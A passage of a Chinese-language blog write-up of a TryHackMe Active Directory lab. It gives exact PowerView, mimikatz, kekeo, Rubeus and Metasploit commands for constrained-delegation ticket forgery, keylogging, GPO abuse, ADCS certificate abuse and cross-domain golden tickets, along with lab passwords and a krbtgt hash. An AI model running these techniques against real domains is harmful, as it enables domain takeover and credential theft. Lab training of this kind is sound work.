delegation），非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。
可能你还是有点不太理解为什么要这么绕，其实是为了方便管理和安全性，如果有应用要跨域身份验证，可能需要将用户的身份验证和授权凭据传递给其他域。例如，在使用Single
Sign-On（SSO）技术时，可能需要将用户的凭据传递给不同的域和应用。使用Kerberos委派，可以安全地将用户的凭据委派给其他域和应用，以便这些域和应用可以代表用户访问其他资源或服务。在一些复杂的应用中，可能会有多层应用需要进行身份验证和授权。例如，在使用企业级应用时，可能需要通过多个层次的中间件和服务进行身份验证和授权。使用Kerberos委派，可以将用户的凭据委托给每个层次的中间件和服务，以便这些中间件和服务可以代表用户访问其他资源或服务。
利用过程：
    Import-Module C:\Tools\PowerView.ps1 
    Get-NetUser -TrustedToAuth
PowerView枚举出来的结果，注意msds-allowedtodelegateto字段，告诉我们能委派到那个机器和能模拟的服务，HTTP和WSMAN都能使用powershell去管理，这意味着我们可以直接拿到shell
    token::elevate
    lsadump::secrets
我们拿到密码之后还需要使用一个名字叫做kekeo的工具，用它来生成TGT票据
    tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
伪造 TGS 请求
    tgs::s4u /tgt:PI:EMAIL_krbtgt~PI:EMAIL /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
会站在当前目录生成票据，注意路径问题
利用mimikatz导入票据
    privilege::debug
    kerberos::ptt PI:EMAIL_http~PI:EMAIL
    kerberos::ptt PI:EMAIL_PI:EMAIL
验证能不能成功导入，是否票据正常工作
    klist
    New-PSSession -ComputerName thmserver1.za.tryhackme.loc
    Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
## AD用户行为利用
这部分内容比较简单，感觉和域没什么关系，就简单记录一下，我这里在刚刚的shell拉了个msf上线
现在我们要想办法解密这个kbdx的密码文件
我们现在是用户权限，就可以列出当前的系统进程的部分信息
    ps
不过由于权限太高，要执行键盘记录器这种任务需要以普通用户允许，否则没有任何上下文给我们去窃取。
    keyscan_start
稍等一会儿，拿到密码解开数据库
    keyscan_dump
遗憾的是实验的失败的，压根没有能窃取的用户给我注入进程，我怀疑是公用的靶场，有些人把这个进程弄挂了。不过问题不大，和域没有太大关系，我们就假设我们拿到密码了吧（笑）。
## 组策略利用GPO
组策略经常出现配置错误，组策略管理 (GPM)，GPM 允许我们直接在 AD
结构上定义策略，而不是手动登录一台台机器，在每台机器上本地定义策略。要利用GPO也有很深的学问，现在简单演示来理解一下。
从图中我们可以知道我们现在控制的svcServMan可以修改组策略，这个组策略应用于thmserver2,正好是我们接下来要攻击的机器。
具体利用过程：
    xfreerdp /v:thmwrk1.za.tryhackme.loc /u:svcServMan /p:Sup3rStr0ngPass!@
这里我们用mmc进入编辑器，去file里面找到添加模块，是Group Policy Mangement的策略
找到这个GPO,修改它，点击这个edit，即可修改了
依次如图找到受限的组，在组里面把我们的IT支持组隶属于管理员和远程组
要等待一会，现在这个IT SUPPORT都有THMSERVER2管理员权限了
经过漫长的等待，总算是同步上来了，一直access is denied让我怀疑人生，起码等了半个小时，我一度开始怀疑自己是不是配置错了（苦笑）。
## ADCS（证书模板配置错误）
这部分我用了两个不同的环境演示，帮助大家深入理解。
### 证书是什么？
我们通常只会想到最常见的证书，例如用于将网站流量升级为 HTTPS
的证书。但这些通常仅用于组织向互联网公开的应用程序。那么在内部网络上运行的所有这些应用程序呢，我们现在是否必须为他们提供 Internet
访问权限以允许他们从受信任的证书颁发机构 (CA) 请求证书。
AD CS 是 Microsoft 的公钥基础结构 (PKI) 实现。由于 AD 在组织中提供了一定程度的信任，因此它可以用作 CA 来证明和委托信任。
AD CS
可用于多种用途，例如加密文件系统、创建和验证数字签名，甚至用户身份验证，这使其成为攻击者有前途的途径。使它成为更危险的攻击媒介的是，证书可以在凭证轮换中幸存下来，这意味着即使重置了受感染帐户的密码，也不会使恶意生成的证书无效，从而提供长达
10 年的持续凭证盗窃！
由于 AD CS
是一种特权功能，它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互。另一方面，组织往往太大而无法让管理员手动创建和分发每个证书。这就是证书模板的用武之地。AD
CS
的管理员可以创建多个模板，这些模板可以允许任何具有相关权限的用户自己申请证书。这些模板的参数说明哪个用户可以请求证书以及需要什么，这些参数的特定组合可能具有极大的毒性，并被滥用于特权提升和权限维持。
#### 实际利用过程：
登录进来：
这里我们选中现在能控制的证书模板，修改它的属性
创建成功了
导出证书之后就可以用证书来请求TGT了，需要注意选择DC的ip需要选中运行证书服务器的域控，否则会报错：
    .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:AD.pfx /password:123456 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.83.101
拿到TGT之后直接PASS过去
    kerberos::ptt administrator.kirbi
成功打下DC，完全没问题
    dir \\THMDC.za.tryhackme.loc\c$\
刚刚的靶机环境只有一个证书可以控制，所有没有告诉大家怎么发现这种错误配置的证书，现在回过来重新换一个环境仔细说明一下。
那么那些证书的实际能利用的？需要三个条件。我们先把证书信息导出来：
    certutil -v -template > cert_templates.txt
我们要寻找的关键参数信息：
  1. **Parameter 1: Relevant Permissions**  
我们控制的账户，需要具有生成证书请求的权限才能使此漏洞发挥作用，又因为操作证书的特权一般分配给组，我们还需要搞清楚自己在域中控制了那些组。寻找Allow
Enroll关键字，需要找到和我们组关联的模板，如果要查询自己控制的用户可以使用以下命令
        net user  /domain
  2. **Parameter 2: Client Authentication**  
现在缩小了模板的范围，我们还需要找到一个关键字段EKU，EUK的属性如果设置了Client Authentication，有这个意味着该证书可用于
Kerberos 身份验证。
  3. **Parameter 3: Client Specifies SAN**  
最后，需要验证模板是否允许我们（证书客户端）指定主题备用名称(SAN)，CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT必须设置为1，msf今年6.3版本更新了自动化寻找错误的模块,大大简化了我们找错误配置的麻烦：
    use auxiliary/gather/ldap_esc_vulnerable_cert_finder
以下是结果：
利用就如刚刚那样，去管理控制台生成一下证书就好了。
## 利用域之间的信任关系
域之间有信任关系，在复杂的域环境中存在者域树或者域森林，具体参考[基于域信任关系的域攻击 - Geekby's
Blog](https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/)
都是比较容易的内容，我这里不再重复。
### 黄金票据：
我们通过mimikatz可以生成访问所有服务的TGT，这个TGT绕过了KDC，本质上成为了一个TGS，也就是黄金票据攻击，要伪造这个票据需要四个信息:
  * 域的FQDN
  * 域的SID
  * 伪造用户名，可以是任意的
  * KRBTGT 密码哈希
`lsadump::dcsync /user:za\krbtgt`
### 域之间的黄金TGT（跨域黄金票据）
根据之前枚举的信息，找到分析选项卡，里面有map domain trusts，当下环境是存在双向信任关系的，我们可以之间制作一个特殊的TGT（Inter-Realm）来控制所有域下的服务器：
krbtgt导出hash
获取当前域的sid
    Get-ADComputer -Identity "THMDC"
获取父域的管理员组sid
    Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
要制作这种特殊的票据，就需要上面这两个东西
  * 子域的sid
  * 父域的管理员组sid
导入当前会话，验证票据有效性
    kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
    dir \\thmdc.za.tryhackme.loc\c$
    dir \\thmrootdc.tryhackme.loc\c$\
## 域内热门漏洞
补充一下域内常用的漏洞和描述，鼓励大家去复现和学习如何使用：
  * Zerologon -- CVE-2020-1472 -- 一分钟利用算法置空域控机器账户密码导出全部hash
  * PrintNightmare -- CVE-2021-1675 / CVE-2021-34527 通杀RCE打下域控，偶尔失灵
  * ms14-068 -- 缺少对服务票据中用户SID的正确导致域沦陷
  * exchange相关的漏洞，exchange具备DCSync权限同步，几乎年年爆，大佬挖漏洞挖的比我学的还快
  * NoPAC -- 一个普通域账号接管域，通杀全版本windows
  * ADCS -- CVE-2022-26923 冒充域控机器账户实现权限提升
具体利用方式和其他思路请看
，这个项目去进一步学习，也有一份思维导图可以去参考参考 ，进一步理解和精通可能要花上好长一段的时间。
## 最后
    鸽了太久了，本来早就应该写完了，但是有些地方自己不满意改了不少，参考了不少资料发现有些大佬把简单的东西写的太复杂了，很容易让人抓不到重点，只能硬着头皮往下看了，我自己总结的话可能就尽可能不涉及具体细节了，有兴趣的师傅可以自行查阅相关资料。里面的技术还是要多实践，实际动手操作一下就能踩不少坑，学不少东西了，内网渗透下一篇权限维持我尽量抽空肝出来，有错误的地方麻烦大佬指点。吐槽一下先知的md，没法预览很难受，图片太多一个一个传太浪费时间了，想问问其他师傅是怎么把本地的图片传上来的？md直接复制的话好像是没办法自动上传图片的吧。
参考资料来源：
[浅析黄金票据与白银票据 - Shu1L's blog](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/)  